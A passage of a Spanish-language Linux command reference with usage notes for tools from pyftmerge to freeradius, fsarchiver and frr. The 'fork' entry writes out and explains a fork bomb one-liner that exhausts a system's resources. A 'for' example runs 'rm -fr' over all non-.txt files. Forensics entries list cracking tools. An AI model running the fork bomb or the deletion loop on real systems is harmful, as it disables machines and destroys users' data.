$ pyftmerge fuente_regular.ttf fuente_negrita.ttf fuente_italica.ttf -o fuente_combinada.ttf (combina tres fuentes en un solo archivo fuente_combinada.ttf)
$ pyftsubset fuente.ttf --text="Hola Mundo" --output-file=fuente_subconjunto.ttf (crea versión reducida de la fuente, con los caracteres necesarios para representar el texto "Hola Mundo" y lo guarda como fuente_subconjunto.ttf)
$ ttx fuente.ttf (convierte la fuente en un archivo XML con todas las tablas y datos de la fuente en un formato legible)


fonty-rg
Conjunto de fuentes de consola diseñadas para usarse en terminales de Linux y otros entornos de consola [ttys], y está especialmente orientado a soportar una amplia gama de codificaciones de caracteres incluidas fuentes para las páginas de códigos ISO-8859-1,2,3,4,5,6,7,8,9,10,11,13,14,15,16, KOI8-R,U,C, CP1250, CP1251, CP1252, así como dos fuentes Unicode con amplia cobertura y un archivo ACM ISO-8859-16 y permitir que se pueda mostrar texto correctamente en diversas codificaciones. Incluye las herramientas iso y utf8.
$ iso (sin especificar número, por defecto se usa la codificación ISO-8859-1)
$ iso 2 (usará la codificación ISO-8859-2)
$ iso 5 (usará ISO-8859-5)
$ utf8 (usando codificación UTF-8
Nota.- ISO-8859-1, tambien conocida como Latin-1, era antigamente la usada en muchos países de Europa Occidental como España, Francia, Portugal... pero actualmente se ha sustituido por UTF-8, mucho más versatil.


foomuuri
Es un generador de firewalls bidireccional [controla el tráfico de entrada y también el de salida] para nftables [reemplazo de iptables] basado en el concepto de zonas ["Red interna", "Red externa", "VPN", etc] y compatible con todo tipo de sistemas, desde equipos personales hasta firewalls corporativos, y admite funciones avanzadas como un lenguaje de reglas completo, división de reglas IPv4/IPv6, búsquedas dinámicas de DNS [Permite utilizar nombres de dominio en lugar de direcciones IP estáticas], una API D-Bus y emulación de firewalld para la compatibilidad con zonas de NetworkManager.
Ejemplo de configuración de una red local:
# nano mi_configuracion.json
       {
         "zones": {
           "red_interna": {
             "interfaces": ["eth0"],
             "rules": [
               {
                 "action": "accept",
                 "protocol": "tcp",
                 "port": 80
               },
               {
                 "action": "accept",
                 "protocol": "tcp",
                 "port": 443
               }
                 ]
               },
               "red_externa": {
               "interfaces": ["eth1"],
               "rules": [
                 {
                   "action": "drop",
                   "protocol": "tcp",
                   "port": 80
                 }
              ]
            }
          }
       }
En este ejemplo, se definen dos zonas: red_interna que acepta tráfico HTTP [puerto 80] y HTTPS [puerto 443] en la interfaz eth0 y red_externa que bloquea el tráfico HTTP en la interfaz eth1.
# foomuuri start (cargar archivo de configuración en el kernel)
# foomuuri stop (eliminar conjunto de reglas del kernel)
# foomuuri restart (actualizar reglas)
# foomuuri status (mostrar estado actual)
# foomuuri check (verificar sistaxis del archivo de configuración)
# foomuuri block (bloquear todo el tráfico)
# foomuuri list (listar conjunto de reglas del kernel)
# foomuuri list public-localhost (reglas para la zona especificada cagadas en el kernel)
# foomuuri list macro (listar macros)
# foomuuri list macro telnet (listar macros para el nombre especificado)


foot
Emulador de terminal nativo de Wayland, rápido, ligero y minimalista. Precisa Wayland en ejecución.
$ foot -C (verificar el archivo de configuración)
$ foot nano /etc/passwd (ejecutar una aplicación específica dentro de foot)
$ foot -w 500x300 -T emacs (con una medidas especificas. Por de fecto 700x500 y un título, por defecto "foot")


fop
Aplicación Java que lee un árbol de objetos de formato y luego lo convierte en una amplia variedad de presentaciones de salida [PDF, PNG, PostScript...] o muestra el resultado en la pantalla.
$ fop -fo documento.fo -pdf documento.pdf (convertir un archivo XSL-FO csstoxslfo [ver] a pdf)
$ fop -fo documento.fo -ps documento.ps (lo mismo a postscript)


for
(ucle)]. Ejecuta un trozo de códico si la expresión de control es verdadera y sólo se para cuando es falsa.
Ejemplos:
1.-
 	#!/bin/bash
        for i in $( ls ); do
            echo item --> $i
        done
2.-
	#!/bin/bash
	for i in `seq 1 10`;
	do
		echo $i
	done
Nota.- Si los números los quisieramos en una misma linea, encerrar la variable entre comillas ["`seq 1 10`"]
3.-
	#!/bin/bash
	for i in 1 2 3 4 5
	do
	   echo "Es el número $i "
	done
4.-
	#!/bin/bash
	for i in {1..5}
	do
	   echo "Es el número $i "
	done
5.-
Del 1 al 10 de 2 en 2:
	#!/bin/bash
	for i in {1..10..2}
	do
		echo "Es el número $i "
	done
6.-
	#!/bin/bash
	# eliminar todos los archivos que no sean .txt
	for a in `ls | grep -v txt`
	do
		rm -fr $a
	done


foremancli
Herramienta que permite buscar y acceder a toda la información de nodos [servidores, máquinas virtuales, etc.] almacenada en un servidor Foreman. Permite consultar datos como hosts, facts de Puppet/Ansible, parámetros, grupos, etc., y formatear la salida en texto plano, JSON o YAML.
$ foremancli hosts list (listar todos los hosts registrados en Foreman)
$ foremancli hosts show web-server01 (buscar un host específico por nombre)
$ foremancli facts show db-server01 (obtener "facts" de un nodo [datos de Puppet/Ansible])
$ foremancli hosts list --search 'os = Ubuntu' (filtrar hosts por un parámetro)
$ foremancli parameters list (listar parámetros globales)
$ foremancli hosts list --output yaml > hosts_inventory.yaml (exportar datos para usar en scripts [YAML])


foremost
Recuperación de datos
# foremost -i /dev/sda -o /recovery
# foremost -t jpg -i /dev/sda3 -o /home/usr/recuperado (Recuperar jdatepgs de una partición)
proceso sobre una imagen:
# dd if=/dev/sda1 of=imagen.iso conv=noerror,sync (Crear la imagen iso del dispositivo a recuperar. “conv=noerror,sync” indica que ignore errores)
# foremost -v -t all -o /home/usuario/recuperado -i imagen.iso
	-v .- modo detallado
	-o .- lugar donde almacenar los archivos recuperados
	-t all .- tipo de archivo a buscar. Para recuperar solo jpg: -t jpg. Para una lista de extensiones: -t jpg,doc,png
	-i .- lugar donde esta la iso a escanear.


forensics-all
Herramienta que proporciona los componentes principales para un entorno forense. El metapaquete incluye la mayoría de los programas para recuperación de datos, búsqueda de rootkits y exploits, análisis de sistemas de archivos y memoria, adquisición de imágenes, inspección de volumen, acciones especiales sobre el hardware y muchas otras actividades. Incluye las herramientas acct, aesfix, afflib-tools, aircrack-ng, braa, bruteforce-salted-openssl, bruteforce-wallet, brutespray, btscanner, bully, capstone-tool, ccrypt, cewl, chaosreader, chkrootkit, cisco7crack, cowpatty, crack or crack-md5, creddump7, dc3dd, de4dot, dirb, dnsrecon, doona, dsniff, ed2k-hash, exifprobe, ext4magic, extundelete, fatcat, fcrackzip, forensic-artifacts, forensics-colorize, galleta, grokevt, hashdeep, hashid, hashrat, hcxkeys, hcxtools, john, mac-robber, magicrescue, maskprocessor, masscan, mdk3, mdk4, medusa, memdump, metacam, mfcuk, mfoc, missidentify, myrescue, nasty, nbtscan, ncat, ncrack, ndiff, nmap, o-saft, ophcrack-cli, outguess, pasco, patator, pff-tools, pipebench, pixiewps, pnscan, polenum, pompem, recoverdm, recoverjpeg, reglookup, regripper, rephrase, rhash, rifiuti, rifiuti2, rkhunter, rsakeyfind, safecopy, samdump2, scalpel, scrounge-ntfs, shed, sleuthkit, smbmap, snowdrop, ssdeep, ssldump, statsprocessor, stegcracker, steghide, stegsnow, sucrack, tableau-parm, tcpick, testssl.sh, time-decode, undbx, unhide, unhide.rb, vinetto, wfuzz, wifite, winregfs, wipe.


forensics-extra
Este paquete proporciona los componentes adicionales para un entorno forense. Todas las herramientas aquí disponibles están basadas en la consola de texto. Ninguna de estas herramientas estaba empaquetada por el equipo de Debian Forensics. Este metapaquete incluye la mayoría de programas de recuperación de datos, búsqueda de rootkit y exploit, sistemas de archivos y análisis de memoria, craker de contraseñas y diccionarios (puestos en /usr/share/dict), desensambladores, acciones especiales sobre el hardware y muchos otras actividades. No existe la intención de proporcionar herramientas para ataques remotos. Paquetes como aircrack-ng se proporcionan para permitir análisis locales sobre archivos pcap. Los paquetes hydra y nmap se pueden usar para encontrar vulnerabilidades dentro de una LAN que está siendo analizada. Este paquete es útil para pentesters, hackers éticos y forenses expertos. Los siguientes paquetes estan incluidos en este metapaquete:
aircrack-ng, bfbtester, binutils, binwalk, bruteforce-luks, bzip2, cabextract, chntpw, clamav, cmospwd, crunch, cryptmount, cupp, dcfldd, disktype, dnsutils, ethstatus, ethtool, exfat-fuse, exfat-utils, exif, exiftags, libimage-exiftool-perl, exiv2, fatcat, fdupes, flasm, foremost, gdisk, geoip-bin, gifshuffle, hashcat, hashid, hexcompare, hexedit, hydra, jdupes, john, lcrack, less, maskprocessor, mc, mdadm, medusa, memstat, mpack, nasm, ncrack, neopi, netcat, nmap, ntfs-3g, ophcrack-cli, outguess, p7zip-full, parted, patator, pcapfix, pdfcrack, poppler-utils (provides pdfinfo), pecomato, pev, polenum, pyrit, rarcrack, samdump2, sipcrack, smb-nat, snowdrop, statsprocessor, stegosuite, stegsnow, sucrack, sxiv, tcpdump, tcpflow, tcpick, tcpreplay, tcpxtract, telnet, testdisk, tshark, uni2ascii, unrar-free, unzip, wamerican, wamerican-huge, wamerican-insane, wamerican-large, wamerican-small, wbrazilian, wbritish, wbritish-huge, wbritish-insane, wbritish-large, wbritish-small, wbulgarian, wcanadian, wcanadian-huge, wcanadian-insane, wcanadian-large, wcanadian-small, wcatalan, weplab, wfrench, wgaelic, wgerman-medical, whois, wifite, wirish, witalian, wmanx, wpolish, wportuguese, wspanish, wswedish, wukrainian, xxd.


fork
[fork bomb]. Consumir los recursos disponibles del sistema, como la CPU y la memoria, hasta el punto en que este queda inutilizable. El comando más representativo asociado a una fork bomb es el siguiente:
      :(){ :|:& };:
Explicación:
    : ----- nombre de la función.
    () { }- define la función sin ningún parámetro.
    :|: --- la función se llama a sí misma y el operador | redirige su salida a una nueva instancia de sí misma.
    & ----- ejecuta las llamadas en segundo plano, permitiendo la creación simultánea de procesos.
    ; ----- separador entre la definición de la función y su ejecución inicial.
    : ----- ejecuta la función, lo que inicia la cascada de procesos.
Una vez en marcha, la fork bomb consume rápidamente los recursos del sistema, bloqueando la capacidad de ejecutar nuevos procesos y usualmente obligando a un reinicio forzado del equipo.


form
Herramienta de manipulación simbólica diseñada para leer expresiones simbólicas desde archivos y ejecutar transformaciones algebraicas y simbólicas sobre ellas. Este tipo de software es útil en áreas como la física teórica, matemáticas y otras disciplinas que requieren cálculos algebraicos complejos.
1.-
Ejemplo
$ nano example.frm
       Symbols x, y;
       Local expr = (x + y)^2;
       Print;
       .end
Symbols x, y;: Declara las variables simbólicas que se usarán, Local expr = (x + y)^2;: Define la expresión matemática que se desea manipular, Print;: Indica que se debe mostrar el resultado y .end: Marca el final del archivo.
$ form example.frm (ejecutar el archivo)
El programa expandirá la expresión (x+y)2(x+y)2 y mostrará:
       expr = x^2 + 2*x*y + y^2;
2.-
Otro ejemplo con derivadas
$ nano derivative.frm
       Symbols x;
       Local f = x^3 + 2*x^2 - x + 5;
       id f = df(f,x);
       Print;
       .end
Symbols x;: Declara la variable simbólica xx, Local f = x^3 + 2*x^2 - x + 5;: Define una función polinómica, id f = df(f,x);: Calcula la derivada de ff respecto a xx y Print;: Muestra el resultado.
$ form derivative.frm
       f = 3*x^2 + 4*x - 1;


forkstat
Supervisa la actividad fork, exec y exit del proceso.
# forkstat -S -e all (mostrar estadisticas de eventos al final de la ejecución i sobre todos los procesos)
# forkstat -s -d (información breve del nombre del proceso sin mostrar la ruta)


fort-validator
Herramienta utilizada en el ámbito de la infraestructura de clave pública de recursos RPKI [Resource Public Key Infrastructure - Infraestructura de Clave Pública de Recursos], que es un sistema de seguridad diseñado para mejorar la seguridad del enrutamiento de Internet. Este validador está basado en el proyecto FORT, un sistema que se encarga de verificar la validez de las rutas BGP [Border Gateway Protocol] mediante el uso de certificados y autorizaciones. La parte principal del sistema RPKI es una base de datos firmada criptográficamente, que un validador lee y procesa. El validador trabaja con las ROA [Route Authorization Object] publicadas para crear una lista de rutas validadas. Una ROA consta de un bloque de direcciones IP y un ASN, que juntos definen quién puede anunciar cada bloque IP.
$ fort-validator --start-rtr (pondrá en marcha el servicio que se encargará de distribuir los datos RPKI validados a los enrutadores a través del protocolo RTR [RPKI-to-Router])
$ fort-validator --check-roa <prefix> <asn> (verificará si el prefijo y AS [Autonomous System Number - Número de Sistema Autónomo] dados están cubiertos por un ROA [Route Origin Authorizations] válido)
$ fort-validator --repo <ruta_del_repositorio> (validar un repositorio RPKI local)


fortune-anarchism
Mostrar frases anarquistas aleatorias.
$ fortune /usr/share/games/fortunes/anarchism


fortunes
[fortunes-es fortunes-es-off]. Mostrar frases aleatorias.
$ fortune
$ fortune -l (muestra citas largas)
$ fortune -s (citas cortas)
$ fortune /usr/share/games/fortunes/off/es/off/
$ fortune /usr/share/games/fortunes/linux


fossil
Es un sistema de control de versiones distribuido (DVCS), similar a Git o Mercurial. Permite el acceso y la administración mediante HTTP CGI o mediante un servidor HTTP integrado. Además, cuenta con wiki integrado, explorador de archivos integrado, un sistema de tickets integrado, etc.
$ fossil new proyecto.fossil (crear un nuevo repositorio que contendrá todo el historial y la información del proyecto)
$ fossil open proyecto.fossil (abrir un repositorio existente)
$ fossil add archivo1.txt archivo2.c (añadir archivos al control de versiones)
$ fossil add directorio/ (añadir directorio)
$ fossil add .  (añadir todos los archivos y directorios)
$ fossil commit -m "Mensaje descriptivo del commit" (realizar un "check-in" [commit])
$ fossil status (ver el estado del directorio de trabajo)
$ fossil timeline (ver el historial del repositorio)
$ fossil timeline -n 10  (muestra los últimos 10 eventos)
$ fossil timeline -v  (muestra información más detallada)
$ fossil diff archivo.txt (ver las diferencias entre la versión actual y la última versión guardada)
$ fossil update trunk  (actualiza la rama principal [por defecto])
$ fossil update <hash_del_commit>  (actualiza a un commit específico)
$ fossil branch new nueva_funcionalidad (crear nueva rama)
$ fossil checkout nueva_funcionalidad (cambiar entre ramas)
$ fossil checkout trunk  (volver a la rama principal)
$ fossil merge nueva_funcionalidad (fusionar rama especificada con la principal)
$ fossil ui (inicia un servidor web local que permite acceder al repositorio a través de un navegador en la dirección http://localhost:8080, por defecto)
$ fossil ticket new "Corregir error de validación en el formulario" (crear ticket asociado al proyecto)
$ fossil ticket info <id_del_ticket> (ver ticket)
$ fossil ticket edit <id_del_ticket> -status fixed (editar ticket)
$ fossil wiki export wiki.txt (exportar la wiki)
1.-
Clonar un repositorio remoto a través de HTTP:
$ fossil clone http://servidor/ruta/al/repositorio.fossil mi_copia_local
$ cd mi_copia_local
$ fossil open
2.-
Ignorar archivos y patrones:
Crear un archivo en la raíz del directorio de trabajo
$ nano .fossil-settings
       ignore: *.o
       ignore: tmp/
       ignore: archivo_temporal.log
Fossil no rastreará los archivos o directorios que coincidan con los patrones especificados.


foxeye
Es una base modular genérica multipropósito diseñada para crear clientes o servidores para redes cliente-servidor como IRC [Internet Relay Chat], ICQ [antiguo servicio de mensajería instantánea], y otros protocolos similares. Los módulos disponibles son: autolog, irc, irc-channel, irc-ctcp, ircd, logs, lua, modos, tcl y ziplink.
1.-
Conectarse a un Servidor IRC
Ejemplo simplificado:
# nano /etc/foxeye.conf
       #!/bin/bash
       # Configuración del servidor IRC
       SERVER="irc.freenode.net"
       PORT="6667"
       NICK="usuario"
       CHANNEL="#canal"
$ foxeye --protocol irc --server $SERVER --port $PORT --nick $NICK --join $CHANNEL (conectarse al servidor IRC específico, con un apodo y uniéndose a un canal determinado)
2.-
Crear un Servidor de Chat Básico
# nano /etc/foxeye.conf
       #!/bin/bash
       # Configuración del servidor de chat
       PORT="12345"
       # Usar foxeye para iniciar un servidor de chat
$ foxeye --mode server --protocol chat --port $PORT (funcionar como un servidor de chat en el puerto especificado)
3.-
Conectarse a un Servicio de Mensajería ICQ
# nano /etc/foxeye.conf
       #!/bin/bash
       # Configuración del servicio ICQ
       USERNAME="tu_usuario"
       PASSWORD="tu_contraseña"
$ foxeye --protocol icq --username $USERNAME --password $PASSWORD (conectarse a un servicio de mensajería ICQ con las credenciales proporcionadas)


fpart
Herramienta que ayuda a ordenar árboles de archivos y empaquetarlos en bolsas llamadas "particiones". Divide una lista de directorios y árboles de archivos en un número determinado de particiones, intentando generar particiones con el mismo tamaño y número de archivos y creando subcarpetas dentro de la carpeta original para cada partición. Una vez generadas, las particiones se imprimen como listas de archivos en la salida estándar [predeterminada] o como archivos.
$ fpart -n 4 ~/Documentos (dividir una carpeta en 4 particiones iguales)
$ fpart -s 100M ~/Documentos (dividir una carpeta en particiones de 100MB cada una)
$ fpart -m 5000 ~/Documentos (dividir una carpeta en particiones con un máximo de 5000 archivos cada una)
$ fpart -s 200M -m 3000 ~/Documentos (dividir una carpeta en particiones con un tamaño máximo de 200MB y un máximo de 3000 archivos)
$ fpart -v ~/Documentos (verificar el estado de las particiones creadas)


fpdns
Herramienta utilizada para realizar fingerprinting de servidores DNS, es decir, identificar remotamente la versión o implementación del software del servidor DNS, útil en auditorías de seguridad, pruebas de penetración y análisis de infraestructura.
$ fpdns 192.168.1.1 (analizar un servidor DNS)
La salida podría ser algo como:
          192.168.1.1: ISC BIND 9.16.x
Esto indica que el servidor está ejecutando una versión específica de BIND.


fping
Determina máquinas de una red activas
# fping -g 192.168.2./24 2> /dev/null | grep alive


fprintd
Demonio D-Bus que permite a los aplicaciones acceder a los lectores de huellas dactilares conectados al sistema. Incluye la herramientas fprintd-delete, fprintd-enroll, fprintd-list y fprintd-verify
# systemctl status fprintd (verificar el estado del demonio)
# fprintd-list (Lista las huellas dactilares registradas del usuario)
# fprintd-verify (compara las huellas dactilares del usuario con la base de datos)


fprobe
Herramienta basada en libpcap que captura tráfico de red en una interfaz específica y lo convierte en flujos NetFlow, los cuales luego envía a un recopilador remoto para su análisis. NetFlow es un protocolo desarrollado por Cisco que permite recopilar y analizar información sobre el tráfico de red, como direcciones IP de origen y destino, puertos, protocolos, y volumen de datos, sin necesidad de capturar paquetes completos. Esto lo hace útil para monitoreo de red, detección de anomalías o análisis de rendimiento.
# fprobe -i eth0 -f "tcp and port 80" 192.168.1.100:2055 (monitorea la interfaz eth0, filtra solo el tráfico TCP en el puerto 80 y lo envia a la dirección y puerto del recopilador remoto)
# fprobe -i eth0 -f "vlan and ip" -K 18 192.168.1.100:2055 (capturar tráfico IP dentro de VLANs y especifica un tamaño de cabecera de 18 bytes)
# fprobe -i eth0 -f ip -B 4096 -r 2 -q 10000 -t 10000:10000000 192.168.1.100:2055 (capturar todo el tráfico IP, tamaño del búfer en 4096 flujos, prioridad en tiempo real para evitar pérdidas, cola de paquetes y límite de emisión [10 KB o 10M paquetes])
# fprobe -i eth0 192.168.1.100:2055 192.168.1.101:2055//r 192.168.1.102:2055//r (//r: Indica que los datos se distribuirán en modo round-robin entre los recopiladores)
# fprobe -f ip 192.168.1.100:2055 (capturar tráfico genérico en la interfaz predeterminada)


fpzip
Utilidad para la compresión sin pérdida y opcionalmente con pérdida de matrices de punto flotante 2D y 3D. fpzip asume datos escalares correlacionados espacialmente, como funciones continuas muestreadas regularmente, y no es adecuado para comprimir secuencias no estructuradas de números de punto flotante.
$ fpzip -i entrada.dat -o salida.fpzip (forma básica)
$ fpzip -d comprimido.fpzip -o descomprimido.dat (descomprimir)
$ fpzip -i entrada.dat -o salida.fpzip -p 4 (comprimir con un nivel de precisión de 4)
$ fpzip -v salida.fpzip (mostrar información sobre el archivo comprimido)
$ fpzip -i entrada.dat -o salida.fpzip -H (comprimir archivos muy grandes que no caben  memoria y que se debe incluir la cabecera en el archivo de salida)


framebuffer
Es una porción de memoria, generalmente en la RAM o en la memoria de la GPU, que representa la pantalla en modo gráfico o texto. En Linux, el framebuffer [/dev/fb0, por ejemplo] permite dibujar directamente en la pantalla sin necesidad de un entorno gráfico completo y es más rápido y ligero que terminales basadas en X11. Es una región de memoria en el sistema que se utiliza para almacenar una representación de los píxeles que se mostrarán en la pantalla. En esencia, es una abstracción que permite al sistema operativo y a las aplicaciones enviar datos gráficos, como colores, intensidades, etc. directamente al hardware de la pantalla, sin necesidad de interactuar con controladores gráficos complejos. El framebuffer soporta diferentes resoluciones y profundidades de color, por ejemplo, 8 bits, 16 bits, 32 bits por píxel, dependiendo del hardware y del controlador. En Linux moderno, el sistema de framebuffer [fbdev] está siendo reemplazado por DRM/KMS, que ofrece una gestión más avanzada de gráficos, incluyendo soporte para aceleración por hardware y cambios de resolución dinámicos. DRM/KMS es más eficiente y está mejor integrado con entornos gráficos modernos como Wayland.
# fbset -i (mostrar información del frambuffer. Ver fbset)
# fbi -vt 01 linux.png (ver una imagen en framebuffer. Ver fbi)


francine
Programa de inicio de sesión que se basa en el archivo de configuración /etc/francine.sl. Adicionalmente, para comprobar la autenticación de inicio de sesión se utilizan los archivos del directorio /etc/securetty/. Este programa no acepta ninguna opción.
# nano /etc/francine.sl
       % la mayoría de las entradas de configuración son modificadores; 1 significa sí (o verdadero),
       % 0 significa no (o falso).
       %
       % establece si se debe evaluar /etc/securetty.
       support_securetty = 1;
       %
       % establece si se debe establecer un entorno $PATH estándar.
       % activarlo significa un mejor cumplimiento del inicio de sesión estándar.
       set_path_env = 1;
       %
       % establece si se debe verificar el buzón del sistema para ver si hay correo electrónico nuevo.
       check_email = 1;
       %
       % establece si se debe admitir la salida de voz a /dev/speech.
       speech_support = 0;
       %
       % establece el dispositivo de voz (predeterminado: /dev/speech)
       % set_speech_device("/dev/speech");
       %
       % establece la cantidad de segundos después de los cuales francine debe expirar.
       % 0 significa que no hay tiempo de espera.
       timeout = 0;
       %
       % establece otra cadena de introducción (la cadena que se imprime durante 1 segundo
       % al iniciar el programa).
       % set_intro_string("¡Bienvenido al pc Deb!\n");
       %
       % establece el directorio del tema (predeterminado: /usr/share/francine/default.theme).
       % modifica esto si instalaste otro tema.
       set_theme_dir("/usr/share/francine/default.theme");
       %
$ francine (prueba sin efecto real)


free
Listar la memoria RAM y swap utilizada y disponible
$ free -m (muestra los resultados en megabytes)


freeboard
Generador de paneles de control en tiempo real de código abierto para IoT y otros mashups web. mashup es una forma de integración y reutilización. Ocurre cuando una aplicación web es usada o llamada desde otra aplicación, con el fin de reutilizar su contenido o funcionalidad. Lanzar en el navegador file:///usr/share/freeboard/index.html


freecdb
Herramienta para crear y leer bases de datos del tipo CDB [Constant DataBase]. Que una base de datos es constante significa que no se puede modificar una vez creada [de solo lectura] y que solo se pueda crear desde cero o leer. Incluye las herramientas cdbdump, cdbget, cdbmake y cdbstats
$ cdbget mydb.cdb key1 (consultar la base de datos)
$ cdbdump mydb.cdb (ver toda la base de datos)
$ cdbstats (lee la base de datos e imprime algunas estadísticas)
$ cdbmake cdb cdb.tmp (cdb.tmp son los datos y con ellos, cdbmake crea la cdb)


freediameter
Se refiere a una implementación de código abierto del protocolo Diameter, que es utilizado para transportar información de Autenticación, Autorización y Contabilidad [Authentication, Authorization and  Accounting - AAA] en redes de telecomunicaciones. Diameter es el sucesor del protocolo RADIUS y se utiliza ampliamente en redes móviles y de banda ancha para gestionar la autenticación de usuarios, la autorización de servicios y la contabilidad de uso.
# freediameterd -c /etc/freediameter/freediameter.conf (iniciar freediameter)
# systemctl status freediameter (verificar el estado del servicio)
1.-
Configurar peers que son nodos con los que freediameter se comunicará
# nano /etc/freediameter/freediameter.conf
       # Configuración del peer local
       LocalPeer = {
           Identity = "local.peer.com";
           Realm = "local.realm.com";
           Vendor-Id = 0;
           Product-Name = "FreeDiameter";
           Firmware-Revision = 1;
           Host-IP-Address = "127.0.0.1";
           Sec-IP-Address = "127.0.0.1";
           Port = 3868;
           Sec-Port = 3869;
           Tc = 1;
           Origin-State-Id = 1;
           Supported-Vendor-Id = 0;
           Auth-Application-Id = 16777216;
           Acct-Application-Id = 16777217;
           Vendor-Specific-Application-Id = 16777251;
       }
       # Configuración del peer remoto
       Peer = {
           Identity = "remote.peer.com";
           Realm = "remote.realm.com";
           Vendor-Id = 0;
           Product-Name = "RemotePeer";
           Firmware-Revision = 1;
           Host-IP-Address = "192.168.1.1";
           Sec-IP-Address = "192.168.1.1";
           Port = 3868;
           Sec-Port = 3869;
           Tc = 1;
           Origin-State-Id = 1;
           Supported-Vendor-Id = 0;
           Auth-Application-Id = 16777216;
           Acct-Application-Id = 16777217;
           Vendor-Specific-Application-Id = 16777251;
       }
2.-
Monitoreo y Depuración
Para monitorear y depurar habilitar el modo de depuración en el archivo de configuración y revisar los logs:
# nano /etc/freediameter/freediameter.conf
Añadir:
        # Habilitar depuración
        Debug = "yes";
Luego, reiniciar el servicio y revisar los logs:
# systemctl restart freediameter
# tail -f /var/log/freediameter/freediameter.log


freeradius
[libssl-dev freeradius-mysql freeradius-utils]. Servidor.
Configurar la base de datos:
# nano /etc/freeradius/sites-enabled/default
En los apartados "authorize" y "accouting" descomentar las lineas sql
# nano /etc/freeradius/radius.conf
Descomentar la linea $INCLUDE sql.conf
Configurar usuario, contraseña y mensaje de bienvenida:
# nano /etc/freeradius/users
USUARIO Cleartext-Password := "CONTRASEÑA"
        Reply-Message "Entrando en el servidor el usuario %{User_Name}"
Configurar usuario y contraseña del router o punto de acceso:
# nano /etc/freeradius/clients.conf
client 192.168.1.0/24 {
	secret		= CONTRASEÑA_ROUTER
	shortname	= USUARIO_ROUTE
Finalmente entrar en router y colocar la ip del equipo donde hemos instalado el servidor. Reiniciar el servicio.
# /etc/init.d/freeradius restart
# freeradius -X (Arrancar em modo debug)
# radtest USUARIO testing 127.0.0.1 1812 testing123 (Testear si la configuración de un usuario está correcta)


freetds
Conjunto de herramientas y bibliotecas que proporciona FreeTDS, un proyecto de código abierto que implementa el protocolo Tabular Data Stream [TDS]. Este protocolo es utilizado por Microsoft SQL Server y Sybase para la comunicación cliente-servidor. Incluye las herramientas bsqldb, bsqlodbc, datacopy, defncopy, fisql, freebcp, osql, tdspool y tsql
$ tsql -S servidor -U usuario -P contraseña (conexión a un servidor MSSQL/Sybase)
$ fisql -S servidor -U usuario -P contraseña -i entrada.sql -o salida.log (trabajar con scripts SQL)
$ bsqldb -S servidor -U usuario -P contraseña -i script.sql -o resultado.txt (ejecución de scripts en modo batch)
$ bsqlodbc -S servidor -U usuario -P contraseña (versión ODBC de bsqldb, usado para conectarse a través de ODBC en lugar de TDS directo)
$ freebcp mi_base.dbo.mi_tabla in datos.txt -S servidor -U usuario -P contraseña -c (importar datos de una tabla. -c indica que se usará formato de texto)
$ datacopy -S origen -U user1 -P pass1 -D db1 -t tabla -s destino -u user2 -p pass2 -d db2 -T tabla_destino (copiar datos directamente entre dos servidores MSSQL/Sybase)
1.-
Ejemplo de entrada
# nano /etc/freetds/freetds.conf
       [mi_servidor]
           host = 192.168.1.100
           port = 1433
           tds version = 7.3


freezer-api
Servicio backups, restauración de copias de seguridad y recuperación ante desastres de OpenStack como servicio. Contiene el demonio.
# systemctl start freezer-api (iniciar el servicio)
# freezer-api (iniciarlo directamente)
# curl -X GET http://localhost:9090/v1/jobs -H "X-Auth-Token: YOUR_OPENSTACK_TOKEN" (listar jobs de backup)
1.-
Crear un nuevo job de backup
# curl -X POST http://localhost:9090/v1/jobs -H "Content-Type: application/json" -H "X-Auth-Token: YOUR_TOKEN" -d '{
      "job": {
          "client_id": "nova-instance-1",
          "job_actions": [
              {
                "freezer_action": {
                    "action": "backup",
                    "mode": "nova",
                    "nova_instance_id": "1234-5678-90ab-cdef",
                    "storage": "swift",
                    "container": "my_backups"
                }
            }
        ]
    }
}'
2.-
Configuración típica
# nano /etc/freezer/freezer.conf
       [DEFAULT]
        log_file = /var/log/freezer/freezer-api.log
        bind_host = 0.0.0.0
        bind_port = 9090
        auth_strategy = keystone
        enable_v1_api = True
       [database]
        connection = mysql+pymysql://freezer:password@localhost/freezer


frei0r-plugins
Es un API [Application Programming Interface - Interfaz de Programación de Aplicaciones] minimalista y multiplataforma para plugins de efectos y fuentes de vídeo. El paquete instala las bibliotecas de los plugins [.so] normalmente en /usr/lib/frei0r-1, y las aplicaciones de vídeo que soportan la API de Frei0r cargan dinámicamente estas bibliotecas cuando necesitan aplicar un efecto o utilizar una fuente de vídeo proporcionada por uno de los plugin.


freshclam
[clamav-freshclam]. Actualizar la base de datos de virus. Ver clamav


frr
[Free Range Routing]. Se compone de varios demonios [servicios] que se pueden gestionar individualmente y que implementan y gestionan diversos protocolos de enrutamiento IPv4 e IPv6 tales como: BGP [Border Gateway Protocol], OSPF [Open Shortest Path First], RIP [Routing Information Protocol], ISIS [Intermediate System to Intermediate System], PIM [Protocol Independent Multicast] y LDP [Label Distribution Protocol]. Los demonios principales de FRR on: zebra [núcleo de FRR, maneja la tabla de enrutamiento del sistema operativo], bgpd [para BGP], ospfd [para OSPFv2]. ospf6d [para OSPFv3 (IPv6)], ripd [para RIP], ripngd [para RIPng (IPv6)], isisd [para IS-IS] y pimd [para multicast].
1.-
Ejemplo de configuración mínima para BGP
# nano /etc/frr/daemons:
       zebra=yes
       bgpd=yes
# nano /etc/frr/frr.conf
       hostname router1
       password zebra
       enable password zebra
       router bgp 65001
        bgp router-id 1.1.1.1
        neighbor 192.0.2.2 remote-as 65002
        network 10.0.0.0/24
# systemctl restart frr (reiniciar el servicio)
Una vez que FRR está en marcha, se puede interactuar con la suite mediante el comando:
# ntysh
Y desde ahí se puede usar comandos como si se estuviera en un router Cisco, por ejemplo:
        router# show ip bgp
        router# conf t
        router(config)# router ospf


fsarchiver
Es una herramienta similar a partimage para crear imágenes de una o varias particiones a la vez a un fichero asi como restaurar dichas imágenes más tarde.
# fsarchiver savefs /data/imagen.fsa /dev/sda1 (creamos la imagen de la partición).
# fsarchiver savefs /data/imagen2.fsa /dev/sda1 /dev/sdb1 (creamos la imagen de dos particiones simultaneamente que seran almacenadas en el mismo fichero).
# fsarchiver restfs /data/imagen2.fsa id=0,dest=/dev/sda1 (restauramos la primera partición de la imagen).
# fsarchiver restfs /data/imagen2.fsa id=1,dest=/dev/sdb1 (restauramos la segunda partición).
# fsarchiver restfs /data/imagen2.fsa id=0,dest=/dev/sda1 id=1,dest=/dev/sdb1 (restauramos a la vez las dos particiones).


fscache
